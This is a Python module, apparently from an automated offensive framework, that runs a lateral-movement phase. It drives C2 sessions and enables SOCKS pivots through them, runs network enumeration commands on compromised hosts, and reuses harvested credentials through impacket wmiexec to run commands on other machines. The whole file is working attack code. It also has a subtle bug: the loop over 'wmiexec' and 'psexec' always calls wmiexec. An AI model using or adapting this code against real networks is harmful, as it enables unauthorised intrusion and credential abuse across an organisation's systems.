import time
import logging

from orchestrator.brain.phases.models import Finding, PhaseResult, Severity
from orchestrator.c2.manager import get_c2
from orchestrator.ad.toolkit import get_ad_toolkit
from orchestrator.pivot.manager import get_pivot, PivotHop

logger = logging.getLogger("phase_lateral")


async def run_lateral(target: str, findings: list[Finding] = None) -> PhaseResult:
    t0 = time.time()
    lateral_findings = []
    c2 = get_c2()
    ad = get_ad_toolkit()

    sessions = await c2.refresh_sessions()

    creds = []
    for f in (findings or []):
        if f.type in ("credential", "password", "hash"):
            creds.append({"source": f.host or target, "cred": f.evidence[:200]})

    for s in sessions:
        if not s.proxy_url:
            proxy = await c2.socks_enable(s.id)
            if proxy:
                get_pivot().add_hop(PivotHop(
                    session_id=s.id, hostname=s.hostname,
                    address=s.address, proxy_url=proxy,
                ))

        for cmd in ["arp -a", "net view", "nslookup %USERDNSDOMAIN%"]:
            result = await c2.execute(s.id, cmd)
            if result.output:
                lateral_findings.append(Finding(
                    phase="lateral", type="network_enum", target=target,
                    host=s.address, severity=Severity.INFO,
                    description=f"$ {cmd}",
                    evidence=result.output[:500],
                ))

        if ad.has_impacket and creds:
            for stored in creds:
                if ":" in stored.get("cred", ""):
                    parts = stored["cred"].split(":")
                    user, pwd = parts[0], ":".join(parts[1:])
                    for method in ["wmiexec", "psexec"]:
                        try:
                            result = ad.wmiexec(
                                stored.get("source"), user, pwd,
                                command="whoami",
                                proxy_env=get_pivot().env_for_target(stored.get("source", "")),
                            )
                            if result.get("success") and result.get("stdout", "").strip():
                                lateral_findings.append(Finding(
                                    phase="lateral", type=f"{method}_success", target=target,
                                    host=stored.get("source"), severity=Severity.CRITICAL,
                                    description=f"{method} via {user}:{pwd[:4]}*** on {stored.get('source')}",
                                    evidence=result["stdout"][:300],
                                ))
                        except Exception as e:
                            logger.debug(f"  {method} failed: {e}")

    latency = time.time() - t0
    return PhaseResult(
        phase="lateral",
        success=len(lateral_findings) > 0,
        findings=lateral_findings,
        summary=f"Lateral: {len(sessions)} sessions checked, {len(lateral_findings)} findings",
        raw_output=f"sessions: {len(sessions)} | creds: {len(creds)}",
        latency=latency,
    )
